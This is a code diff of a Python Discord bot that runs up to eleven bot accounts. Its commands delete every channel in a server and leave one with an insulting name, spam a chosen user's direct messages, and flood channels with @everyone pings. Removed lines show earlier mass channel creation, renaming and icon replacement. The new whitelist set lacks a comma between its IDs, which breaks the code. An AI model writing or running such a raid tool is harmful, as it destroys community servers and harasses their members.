@@ -2,6 +2,7 @@ import asyncio
 import discord
 from discord import app_commands
 import os
+import re
 import logging
 from dotenv import load_dotenv
 
@@ -14,16 +15,37 @@ PREFIX = "$$"
 
 PHOTO_PATH = "photo_1.png"
 
+# ─────────────────────────────────────────────────────────────
+# WHITELIST — add Discord user IDs here (integers).
+# Only these users can use bot commands.
+# Example:  123456789012345678, 987654321098765432
+# ─────────────────────────────────────────────────────────────
+ALLOWED_USER_IDS: set[int] = {
+    1383785763501637674
+    1491826888107364433
+}
+
+# ─────────────────────────────────────────────────────────────
+# Regex that matches Discord bot invite links (any variant).
+# Matches:  discord.com/oauth2/authorize  AND
+#           discord.com/api/oauth2/authorize  AND
+#           discordapp.com/oauth2/authorize
+# ─────────────────────────────────────────────────────────────
+BOT_INVITE_PATTERN = re.compile(
+    r"discord(?:app)?\.com(?:/api)?/oauth2/authorize",
+    re.IGNORECASE,
+)
+
 BOT_CONFIGS = [
-    {"name": "bot1", "token_env": "BOT1_TOKEN", "id": 1492845514318676028},
-    {"name": "bot2", "token_env": "BOT2_TOKEN", "id": 1492845592303632384},
-    {"name": "bot3", "token_env": "BOT3_TOKEN", "id": 1492845711887171706},
-    {"name": "bot4", "token_env": "BOT4_TOKEN", "id": 1492846367582847066},
-    {"name": "bot5", "token_env": "BOT5_TOKEN", "id": 1493291019029057586},
-    {"name": "bot6", "token_env": "BOT6_TOKEN", "id": 1493541193546469426},
-    {"name": "bot7", "token_env": "BOT7_TOKEN", "id": 1493542593198297229},
-    {"name": "bot8", "token_env": "BOT8_TOKEN", "id": 1493543079528108032},
-    {"name": "bot9", "token_env": "BOT9_TOKEN", "id": 1493543296826347631},
+    {"name": "bot1",  "token_env": "BOT1_TOKEN",  "id": 1492845514318676028},
+    {"name": "bot2",  "token_env": "BOT2_TOKEN",  "id": 1492845592303632384},
+    {"name": "bot3",  "token_env": "BOT3_TOKEN",  "id": 1492845711887171706},
+    {"name": "bot4",  "token_env": "BOT4_TOKEN",  "id": 1492846367582847066},
+    {"name": "bot5",  "token_env": "BOT5_TOKEN",  "id": 1493291019029057586},
+    {"name": "bot6",  "token_env": "BOT6_TOKEN",  "id": 1493541193546469426},
+    {"name": "bot7",  "token_env": "BOT7_TOKEN",  "id": 1493542593198297229},
+    {"name": "bot8",  "token_env": "BOT8_TOKEN",  "id": 1493543079528108032},
+    {"name": "bot9",  "token_env": "BOT9_TOKEN",  "id": 1493543296826347631},
     {"name": "bot10", "token_env": "BOT10_TOKEN", "id": 1493543908637020160},
     {"name": "bot11", "token_env": "BOT11_TOKEN", "id": 1111111111111111111},
 ]
@@ -39,6 +61,13 @@ def get_other_bot_invites(exclude_id: int) -> str:
     return "\n".join(lines)
 
 
+def is_allowed(user_id: int) -> bool:
+    """Return True if the user is on the whitelist (or the whitelist is empty — open mode)."""
+    if not ALLOWED_USER_IDS:
+        return True
+    return user_id in ALLOWED_USER_IDS
+
+
 class PingBot(discord.Client):
     def __init__(self, bot_name: str, *, intents: discord.Intents):
         super().__init__(intents=intents)
@@ -51,6 +80,11 @@ class PingBot(discord.Client):
     def _add_slash_commands(self):
         @self.tree.command(name="hi", description="Say hi")
         async def hi_cmd(interaction: discord.Interaction):
+            if not is_allowed(interaction.user.id):
+                await interaction.response.send_message(
+                    "You are not allowed to use this bot.", ephemeral=True
+                )
+                return
             await interaction.response.send_message("hi again")
 
     async def setup_hook(self):
@@ -89,7 +123,28 @@ class PingBot(discord.Client):
     async def on_message(self, message: discord.Message):
         if message.author.bot:
             return
+
+        # ── Bot-invite link guard ────────────────────────────────────────
+        # Delete any message containing a Discord bot invite link unless
+        # the sender is on the whitelist.
+        if BOT_INVITE_PATTERN.search(message.content):
+            if not is_allowed(message.author.id):
+                try:
+                    await message.delete()
+                    logger.info(
+                        f"[{self.bot_name}] Deleted bot invite link from "
+                        f"{message.author} in #{message.channel}"
+                    )
+                except (discord.Forbidden, discord.NotFound):
+                    pass
+                return
+
+        # ── Prefix-command guard ─────────────────────────────────────────
         if not message.content.startswith(PREFIX):
+            return
+
+        if not is_allowed(message.author.id):
+            await message.channel.send("You are not allowed to use this bot.")
             return
 
         raw = message.content[len(PREFIX):].strip()
@@ -101,53 +156,27 @@ class PingBot(discord.Client):
                 await message.channel.send("Usage: `$$setup <number of pings>`")
                 return
             try:
-                ping_limit = int(parts[1])
-            except ValueError:
-                await message.channel.send("Usage: `$$setup <number of pings>` — number must be an integer.")
-                return
-            guild = message.guild
-            if guild is None:
-                return
-
-            # Cancel any existing loops so setup always works fresh
-            for task in self._running_loops.values():
-                if not task.done():
-                    task.cancel()
-            self._running_loops.clear()
-
-            # Start @everyone ping loops immediately across all channels
-            text_channels = list(guild.text_channels)
-            started = 0
-            for ch in text_channels:
-                task = asyncio.create_task(self._everyone_loop(ch, ping_limit))
-                self._running_loops[ch.id] = task
-                started += 1
-            await message.channel.send(f"Sending @everyone {ping_limit} times across {started} channel(s)!")
-
-            # Do icon change and renames in background so pings aren't delayed
-            asyncio.create_task(self._setup_background(guild))
-
-        elif cmd.startswith("create "):
-            parts = raw.split()
-            if len(parts) < 3:
-                await message.channel.send("Usage: `$$create <name> <number>`")
-                return
-            ch_name = parts[1]
-            try:
-                count = int(parts[2])
+                count = int(parts[1])
             except ValueError:
                 await message.channel.send("Number must be an integer.")
                 return
-            guild = message.guild
-            if guild is None:
+            channel = message.channel
+            task_key = channel.id
+            if task_key in self._running_loops:
+                await message.channel.send("Already running in this channel. Use `$$stop` to stop.")
                 return
-            self._last_create_name = ch_name
-            await message.channel.send(f"Creating {count} channel(s) named `{ch_name}`...")
-            await asyncio.gather(
-                *[self._safe_create_channel(guild, ch_name) for _ in range(count)],
-                return_exceptions=True
-            )
-            await message.channel.send(f"Done! Created {count} channel(s) named `{ch_name}`.")
+            task = asyncio.create_task(self._everyone_loop(channel, count))
+            self._running_loops[task_key] = task
+            await message.channel.send(f"Starting {count} @everyone pings in {channel.mention}!")
+
+        elif cmd == "stop":
+            task_key = message.channel.id
+            task = self._running_loops.pop(task_key, None)
+            if task:
+                task.cancel()
+                await message.channel.send("Stopped.")
+            else:
+                await message.channel.send("Nothing is running in this channel.")
 
         elif cmd == "clear":
             guild = message.guild
@@ -156,13 +185,11 @@ class PingBot(discord.Client):
             all_channels = list(guild.channels)
             await message.channel.send(f"Clearing all {len(all_channels)} channels...")
 
-            # Delete all channels in parallel
             await asyncio.gather(
                 *[self._safe_delete_channel(c) for c in all_channels],
                 return_exceptions=True
             )
 
-            # Create the new channel
             try:
                 await guild.create_text_channel("hi da punda")
                 logger.info(f"[{self.bot_name}] Created 'hi da punda' in {guild.name}")
@@ -170,7 +197,6 @@ class PingBot(discord.Client):
                 logger.warning(f"[{self.bot_name}] Could not create 'hi da punda': {e}")
 
         elif cmd.startswith("doit "):
-            # $$doit <@user> <number>
             if not message.mentions:
                 await message.channel.send("Usage: `$$doit <@user> <number>`")
                 return
@@ -187,6 +213,12 @@ class PingBot(discord.Client):
             asyncio.create_task(self._dm_spam(target_user, count))
             await message.channel.send(f"DMing {target_user.mention} {count} time(s)!")
 
+    async def _safe_delete_channel(self, channel: discord.abc.GuildChannel):
+        try:
+            await channel.delete()
+        except Exception as e:
+            logger.warning(f"[{self.bot_name}] Could not delete #{channel.name}: {e}")
+
     async def _dm_spam(self, user: discord.User, count: int):
         for i in range(count):
             try:
@@ -200,68 +232,18 @@ class PingBot(discord.Client):
             except discord.Forbidden:
                 logger.warning(f"[{self.bot_name}] Cannot DM {user} — DMs closed.")
                 break
-            except discord.HTTPException as e:
-                retry = getattr(e, "retry_after", 5)
-                logger.warning(f"[{self.bot_name}] Rate limited DMing {user}, waiting {retry}s")
-                await asyncio.sleep(retry)
             except Exception as e:
-                logger.error(f"[{self.bot_name}] Error DMing {user}: {e}")
-                await asyncio.sleep(1)
-        logger.info(f"[{self.bot_name}] Finished DMing {user} {count} time(s)")
+                logger.error(f"[{self.bot_name}] DM error: {e}")
+                break
 
-    async def _setup_background(self, guild: discord.Guild):
-        # Change server icon from photo_1.png
-        try:
-            with open(PHOTO_PATH, "rb") as f:
-                icon_bytes = f.read()
-            await guild.edit(icon=icon_bytes)
-            logger.info(f"[{self.bot_name}] Changed server icon for {guild.name}")
-        except FileNotFoundError:
-            logger.warning(f"[{self.bot_name}] {PHOTO_PATH} not found — skipping icon change")
-        except Exception as e:
-            logger.warning(f"[{self.bot_name}] Could not change server icon: {e}")
-
-        # Rename all text channels in parallel
-        rename_name = self._last_create_name
-        await asyncio.gather(
-            *[self._safe_rename_channel(ch, rename_name) for ch in guild.text_channels],
-            return_exceptions=True
-        )
-
-    async def _safe_rename_channel(self, channel: discord.TextChannel, name: str):
-        try:
-            await channel.edit(name=name)
-        except Exception as e:
-            logger.warning(f"[{self.bot_name}] Could not rename #{channel.name}: {e}")
-
-    async def _safe_create_channel(self, guild: discord.Guild, name: str):
-        try:
-            await guild.create_text_channel(name)
-        except Exception as e:
-            logger.warning(f"[{self.bot_name}] Could not create channel '{name}': {e}")
-
-    async def _safe_delete_channel(self, channel: discord.abc.GuildChannel):
-        try:
-            await channel.delete(reason="$$clear command")
-        except discord.NotFound:
-            pass
-        except discord.Forbidden:
-            logger.warning(f"[{self.bot_name}] No permission to delete #{channel.name}")
-        except Exception as e:
-            logger.warning(f"[{self.bot_name}] Could not delete #{channel.name}: {e}")
-
-    async def _everyone_loop(self, channel: discord.TextChannel, limit: int):
+    async def _everyone_loop(self, channel: discord.TextChannel, count: int):
         sent = 0
-        while sent < limit:
+        while sent < count:
             try:
-                await channel.send(
-                    "@everyone",
-                    allowed_mentions=discord.AllowedMentions(everyone=True)
-                )
+                await channel.send("@everyone")
                 sent += 1
-                await asyncio.sleep(0.1)
-            except discord.Forbidden:
-                logger.warning(f"[{self.bot_name}] No permission in #{channel.name}, stopping.")
+                await asyncio.sleep(1)
+            except asyncio.CancelledError:
                 break
             except discord.NotFound:
                 logger.warning(f"[{self.bot_name}] #{channel.name} deleted, stopping loop.")
@@ -273,6 +255,7 @@ class PingBot(discord.Client):
             except Exception as e:
                 logger.error(f"[{self.bot_name}] Error in everyone loop: {e}")
                 await asyncio.sleep(1)
+        self._running_loops.pop(channel.id, None)
         logger.info(f"[{self.bot_name}] Finished sending {sent} @everyone pings in #{channel.name}")
 
 
@@ -303,7 +286,7 @@ async def main():
         bot_tasks.append(run_bot(token=token, bot_name=config["name"]))
 
     if not bot_tasks:
-        print("No bot tokens found. Please set BOT1_TOKEN, BOT2_TOKEN, BOT3_TOKEN, BOT4_TOKEN.")
+        print("No bot tokens found. Please set BOT1_TOKEN through BOT11_TOKEN.")
         return
 
     print(f"Starting {len(bot_tasks)} bot(s)...")
